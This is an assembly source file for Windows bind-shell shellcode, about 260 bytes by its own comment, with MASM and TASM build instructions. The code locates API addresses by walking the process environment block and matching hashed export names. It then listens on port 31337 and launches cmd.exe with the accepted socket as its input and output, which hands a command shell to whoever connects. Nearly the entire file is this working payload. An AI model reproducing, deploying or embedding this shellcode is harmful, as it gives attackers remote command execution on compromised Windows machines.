comment ~

	This creates and uses WSASocketA handle for hStdInput/hStdOutput in creation of cmd.exe process.
	It works, because the socket is created *without* overlapped attribute..
	
	From the best of my knowledge, David Litchfield used this idea in shellcode first.
	
	260 bytes bind to localhost:31337
	
	still contains null bytes in places.
	
	In regards to using this within a GUI application, you will notice that
	this may not work..AllocConsole API must be added to existing code.
	
	MASM
	
	ml /DMASM /c /Cp /coff /IC:\MASM32\INCLUDE bind_overlap.asm
	link /SUBSYSTEM:CONSOLE /LIBPATH:C:\MASM32\LIB /SECTION:.text,W bind_overlap.obj


	TASM

	implib -c -f -o -i import32.lib %SYSTEMROOT%\system32\kernel32.dll %SYSTEMROOT%\system32\ws2_32.dll
	tasm32 /dTASM /ml /m9 bind_overlap.asm
	tlink32 /Tpe /ap /x bind_overlap.obj,,,import32.lib

	bcom@hushmail.com

~
.586
.model flat,stdcall

IFDEF MASM
include <kernel32.inc>
include <ws2_32.inc>
.data
pad	db	0
.code
ENDIF

IFDEF TASM
extrn	ExitProcess	:proc
extrn	WSAStartup	:proc
.code
	ret
.data
ENDIF

	hLoadLibraryA		EQU	ebp+04
	hCreateProcessA		EQU	ebp+08
	hWaitForSingleObject	EQU	ebp+12

	hWSASocketA			EQU	ebp+16
	hbind				EQU	ebp+20
	hlisten			EQU	ebp+24
	haccept			EQU	ebp+28
 
HASH_CONSTANT	EQU	7

;					macro for generating 16-bit api hashes
hashapi	macro	szApi
	local	dwHash
	dwHash = 0

	forc x, <szApi>
		dwHash = dwHash + "&x"
		dwHash = (dwHash shl HASH_CONSTANT) or (dwHash shr (32-HASH_CONSTANT))
	endm
	dwHash = dwHash and 0ffffh
	dw	dwHash
endm

	assume	fs:nothing
main:
	mov	eax, end_code-entry_point
	sub	esp, 200h
	push	esp
	push	02h
	call	WSAStartup			; just here for testing.
	add	esp, 200h
	;---------------------
;#######################################################################

entry_point:
	add	esp, -28			; create 28 byte stack frame
	
	mov	edi, esp			; edi + ebp will be pointers to api
	mov	ebp, esp
	add	ebp, -4
						; get position in memory
	push	0c356565eh			; pop esi/push esi/push esi/ret
	mov	eax, esp
	call	eax
mem_position:
	inc	byte ptr [esi + (pws32End - mem_position)]	; nullify byte, end of ws2_32 arg
	lea	esi, [esi + (hashed_api - mem_position)]
	jmp	getk32base
hashed_api:
	hashapi <LoadLibraryA>
	hashapi <CreateProcessA>
	hashapi <WaitForSingleObject>

	db	"ws2_32",0ffh,0ffh
pws32End	equ	$-2

	hashapi <WSASocketA>
	hashapi <bind>
	hashapi <listen>
	hashapi <accept>
getk32base:
	push	30h
	pop	ecx
	mov	eax, fs:[ecx]
	mov	eax, [eax + 0ch]
	mov	ebx, [eax + 1ch]
	mov	ebx, [ebx]
	mov	ebx, [ebx + 08h]
	;---------------------
	mov	cl, 03h				; get 3 api first from kernel32.dll
get_apis:
	pushad
	movzx	eax, word ptr [ebx + 3ch]
	mov	esi, [eax + ebx + 78h]
	lea	esi, [ebx + esi + 1ch]
	mov	cl, 03h
load_rva:
	lodsd
	add	eax, ebx
	push	eax
	loop	load_rva
	pop	ebp
	pop	edi
load_index:
	mov	esi, [edi + 4 * ecx]
	add	esi, ebx
	xor	eax, eax
	cdq
hash_export:
	lodsb
	add	edx, eax
	rol	edx, HASH_CONSTANT
	dec	eax
	jns	hash_export
	ror	edx, HASH_CONSTANT
	inc	ecx
	mov	esi, [esp + 08]
	lodsd
	cmp	ax, dx
	jne	load_index
	;-----------------
	dec	ecx
	pop	esi
	xchg	eax, ebp
	movzx	edx,  word ptr [eax + 2 * ecx]
	add	ebx, dword ptr [esi + 4 * edx]
	mov	[esp + 28], ebx
	popad
	inc	esi
	inc	esi
	stosd
	loop	get_apis

	push	esi
	call	dword ptr [hLoadLibraryA]
	xchg	eax, ebx
	lodsd
	lodsd
	;------------------------------
	push	4
	pop	ecx
	dec	edx
	jnz	get_apis

	push	ebx
	push	ebx
	push	ebx		; 0
	push	ebx
	push	ebx
	push	ebx
	push	1
	push	2
	call	dword ptr [hWSASocketA]
	
	push	ebx
	push	ebx
	push	00100007fh			; 127.0.0.1
	push	0697a0002h			; 31337,AF_INET
	mov	edx, esp

	push	16				; sizeof sockaddr_in
	push	edx				; *sockaddr_in
	xchg	eax, ebx
	push	ebx				; handle of socket
	call	dword ptr [hbind]
	add	esp, 4*4

	push	1
	push	ebx
	call	dword ptr [hlisten]
	
	push	eax
	push	eax
	push	ebx
	call	dword ptr [haccept]
	xchg	eax, ebx

	push	"dmc"			; cmd.exe	/ null byte at end
	mov	edx, esp

	xor	eax, eax
	push	eax			; PROCESS_INFORMATION
	push	eax
	push	eax
	push	eax
	mov	esi, esp
	;-------------		; STARTUPINFO
	push	ebx			; hStdError / handle of socket
	push	ebx			; hStdInput
	push	ebx			; hStdOutput
	;--------
	push	eax
	push	eax
	push	101h			; dwFlags	/ null byte at end.
	;---------
	push	11
	pop	ecx
push_stinfo:
	push	eax
	loop	push_stinfo
	mov	ecx, esp

	push	esi			;offset lpProcessInformation
	push	ecx
	push	eax
	push	eax
	push	eax
	push	1			;TRUE
	push	eax
	push	eax
	push	edx			;offset szCmd
	push	eax
	call	dword ptr [hCreateProcessA]

	push	-1						; INFINITE
	lodsd
	push	eax						; process handle
	call	dword ptr [hWaitForSingleObject]
end_code:
	push	0
	call	ExitProcess		; here for test, and because Win2k/XP crash with no API imports in PE file.
end	main